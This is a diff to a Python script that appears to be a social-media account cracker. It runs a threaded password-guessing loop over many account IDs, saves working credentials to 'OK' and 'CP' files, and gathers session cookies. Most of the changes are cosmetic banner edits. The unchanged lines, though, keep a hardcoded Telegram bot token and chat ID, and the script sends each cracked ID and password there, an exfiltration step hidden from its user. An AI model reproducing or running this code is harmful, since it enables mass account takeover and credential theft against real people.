@@ -584,10 +584,10 @@ def setting():
  
 def passwrd():
     print("")
-    print("\033[97;1m[\033[92;1m➢\033[97;1m] RAWA \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTODAY \x1b[36mDATE\x1b[33m] :\033[1;92m "+date)
-    print('\033[97;1m[\033[92;1m➢\033[97;1m] 3ALA \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTOTAL \x1b[36mID\x1b[33m] : ',str(len(id)))
-    print("\033[97;1m[\033[92;1m➢\033[97;1m] RAWA \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTODAY \x1b[36mTIME\x1b[33m] : \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
-    print("\033[97;1m[\033[92;1m➢\033[97;1m] RAWA \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mCRACK AKAT CHAWARE BKA 5 MIN \x1b[36m\x1b[33m]")
+    print("\033[97;1m[\033[92;1m➢\033[97;1m] 𝐑𝐀𝐖𝐀 \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTODAY \x1b[36mDATE\x1b[33m] :\033[1;92m "+date)
+    print('\033[97;1m[\033[92;1m➢\033[97;1m] 𝐑𝐀𝐖𝐀 \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTOTAL \x1b[36mID\x1b[33m] : ',str(len(id)))
+    print("\033[97;1m[\033[92;1m➢\033[97;1m] 𝐑𝐀𝐖𝐀 \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mTODAY \x1b[36mTIME\x1b[33m] : \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
+    print("\033[97;1m[\033[92;1m➢\033[97;1m] 𝐑𝐀𝐖𝐀 \x1b[33m[➢\x1b[33m] \x1b[33m[\033[0;92mCRACK AKAT CHAWARE BKA 5 MIN \x1b[36m\x1b[33m]")
     print('\033[0;96m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -678,7 +678,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\x1b[32m{bo}\x1b[33m[VIP-B-API]\x1b[33m]{P} \x1b[33m[{H}{loop}{P}\x1b[33m] \x1b[33m[{H}{len(id)}{P}\x1b[33m] \x1b[33m[\x1b[32mOK\x1b[30m/\x1b[36mCP\x1b[33m]{bo} \x1b[32m{ok} / \x1b[36m{cp} \x1b[33m[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}\x1b[33m]\033[0;36m "),
+    sys.stdout.write(f"\r\033[1;32m [ 𝐑𝐀𝐖𝐀-𝐕𝐈𝐏💥 ]{P} [{H}{loop}{P}][{H}{len(id)}{P}] [{H}𝑂𝐾{m}${H}{ok}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -722,7 +722,7 @@ def crack(idf,pwv):
                 
                 print ('\x1b[36m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                 print(f'\r\033[0;93m[\33[1;96mNAKRETAUA[😅]\33[1;93m]  {idf}  {pw} ')
-                print ('\x1b[36m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
+                #print ('\x1b[36m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
@@ -733,7 +733,7 @@ def crack(idf,pwv):
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print ('\x1b[32m|﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉﹉|')
                 requests.get(f"https://api.telegram.org/bot6602510569:AAFQ5XG9FhOtXklo9riNScT9eQk4qPzRaio/sendMessage?chat_id=1716814575&text=\r {idf} | {pw}")
-                print(f'\r\33[1;93m[\33[1;92mRAWA-UP-OK💀\33[1;93m] \33[1;92m{idf} {pw} | \n\033[0;92m{kuki} ')
+                print(f'\r\033[1;32m [𝐑𝐀𝐖𝐀-𝑂𝐾] {idf} | {pw} ')
                 print ('\x1b[32m|﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍﹍|')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
